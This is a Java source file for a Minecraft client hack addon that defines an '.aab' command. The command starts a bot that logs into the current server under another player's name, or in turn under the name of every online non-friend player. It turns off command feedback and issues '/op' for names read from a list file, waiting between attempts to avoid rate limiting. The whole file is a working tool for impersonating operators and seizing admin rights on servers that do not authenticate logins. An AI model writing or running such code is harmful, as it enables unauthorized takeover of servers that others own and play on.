package pwn.noobs.trouserstreak.commands;

import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.builder.RequiredArgumentBuilder;
import meteordevelopment.meteorclient.MeteorClient;
import meteordevelopment.meteorclient.commands.Command;
import meteordevelopment.meteorclient.systems.friends.Friends;
import meteordevelopment.meteorclient.utils.player.ChatUtils;
import net.minecraft.client.network.PlayerListEntry;
import net.minecraft.command.CommandSource;
import pwn.noobs.trouserstreak.utils.AAB;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.util.ArrayList;
import java.util.List;

import static com.mojang.brigadier.Command.SINGLE_SUCCESS;

public class AABCommand extends Command {
    private final File aabFolder = new File(MeteorClient.FOLDER, "aab");

    public AABCommand() {
        super("aab", "Logs in as another user and runs commands.");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> builder) {
        // Original: .aab <op_name> <list.txt>
        builder.then(RequiredArgumentBuilder.<CommandSource, String>argument("op_name", StringArgumentType.word())
                .then(RequiredArgumentBuilder.<CommandSource, String>argument("list", StringArgumentType.greedyString())
                        .executes(context -> {
                            String opName = StringArgumentType.getString(context, "op_name");
                            String listName = StringArgumentType.getString(context, "list");
                            return runBot(opName, listName);
                        })));

        // New: .aab @ <list.txt> - targets all server players except friends/self
        builder.then(LiteralArgumentBuilder.<CommandSource>literal("@")
                .then(RequiredArgumentBuilder.<CommandSource, String>argument("list", StringArgumentType.greedyString())
                        .executes(context -> {
                            String listName = StringArgumentType.getString(context, "list");
                            return runBotForAllPlayers(listName);
                        })));
    }

    private int runBot(String opName, String listName) {
        if (!listName.endsWith(".txt")) {
            listName += ".txt";
        }

        File listFile = new File(aabFolder, listName);
        if (!listFile.exists()) {
            ChatUtils.error("List file not found: " + listName);
            return SINGLE_SUCCESS;
        }

        List<String> commandsToRun = new ArrayList<>();
        commandsToRun.add("/gamerule send_command_feedback false");

        try (BufferedReader reader = new BufferedReader(new FileReader(listFile))) {
            String line;
            while ((line = reader.readLine()) != null) {
                line = line.trim();
                if (!line.isEmpty()) {
                    commandsToRun.add("/op " + line);
                }
            }
        } catch (Exception e) {
            ChatUtils.error("Error reading list: " + e.getMessage());
            return SINGLE_SUCCESS;
        }

        if (mc.getCurrentServerEntry() == null) {
            ChatUtils.error("You must be on a server.");
            return SINGLE_SUCCESS;
        }

        String serverIp = mc.getCurrentServerEntry().address;
        ChatUtils.info("Starting background bot as " + opName + "...");
        new Thread(new AAB(serverIp, opName, commandsToRun)).start();

        return SINGLE_SUCCESS;
    }

    private int runBotForAllPlayers(String listName) {
        if (mc.getNetworkHandler() == null) {
            ChatUtils.error("You must be connected to a server.");
            return SINGLE_SUCCESS;
        }

        if (mc.player == null) {
            ChatUtils.error("Player not initialized.");
            return SINGLE_SUCCESS;
        }

        String selfName = mc.player.getGameProfile().name();
        List<String> targetPlayers = new ArrayList<>();

        // Get all players on server except friends and self
        for (PlayerListEntry entry : mc.getNetworkHandler().getPlayerList()) {
            String playerName = entry.getProfile().name();

            // Skip self
            if (playerName.equalsIgnoreCase(selfName)) {
                continue;
            }

            // Skip friends
            if (Friends.get().isFriend(entry)) {
                continue;
            }

            targetPlayers.add(playerName);
        }

        if (targetPlayers.isEmpty()) {
            ChatUtils.warning("No players to target (all are friends or self).");
            return SINGLE_SUCCESS;
        }

        ChatUtils.info("Targeting " + targetPlayers.size() + " players: " + String.join(", ", targetPlayers));

        // Copy for use in thread
        final String listNameFinal = listName;
        final List<String> players = new ArrayList<>(targetPlayers);

        // Run bots sequentially in a background thread (don't block render thread)
        new Thread(() -> {
            for (int i = 0; i < players.size(); i++) {
                String playerName = players.get(i);
                ChatUtils.info("AAB: Trying player " + (i + 1) + "/" + players.size() + ": " + playerName);
                runBotSync(playerName, listNameFinal);

                // Wait for bot to complete before starting next (5 seconds to avoid rate
                // limiting)
                if (i < players.size() - 1) {
                    try {
                        Thread.sleep(5000);
                    } catch (InterruptedException ignored) {
                    }
                }
            }
            ChatUtils.info("AAB: Finished trying all " + players.size() + " players.");
        }).start();

        return SINGLE_SUCCESS;
    }

    // Synchronous version that doesn't start a new thread
    private void runBotSync(String opName, String listName) {
        if (!listName.endsWith(".txt")) {
            listName += ".txt";
        }

        File listFile = new File(aabFolder, listName);
        if (!listFile.exists()) {
            ChatUtils.error("List file not found: " + listName);
            return;
        }

        List<String> commandsToRun = new ArrayList<>();
        commandsToRun.add("/gamerule send_command_feedback false");

        try (BufferedReader reader = new BufferedReader(new FileReader(listFile))) {
            String line;
            while ((line = reader.readLine()) != null) {
                line = line.trim();
                if (!line.isEmpty()) {
                    commandsToRun.add("/op " + line);
                }
            }
        } catch (Exception e) {
            ChatUtils.error("Error reading list: " + e.getMessage());
            return;
        }

        if (mc.getCurrentServerEntry() == null) {
            ChatUtils.error("You must be on a server.");
            return;
        }

        String serverIp = mc.getCurrentServerEntry().address;
        ChatUtils.info("Starting background bot as " + opName + "...");
        new AAB(serverIp, opName, commandsToRun).run(); // Run directly, not in new thread
    }
}
